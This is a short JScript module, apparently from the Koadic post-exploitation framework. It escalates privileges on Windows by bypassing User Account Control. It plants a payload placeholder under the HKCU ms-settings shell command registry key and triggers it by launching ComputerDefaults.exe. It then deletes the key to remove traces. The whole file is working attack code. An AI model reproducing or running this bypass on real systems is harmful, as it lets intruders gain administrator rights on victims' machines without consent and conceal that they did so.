try
{
    var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);

    Koadic.shell.run("ComputerDefaults.exe", true);

    Koadic.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "") != 0)
    {
        Koadic.shell.run("reg delete HKCU\\"+path+" /f", true);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
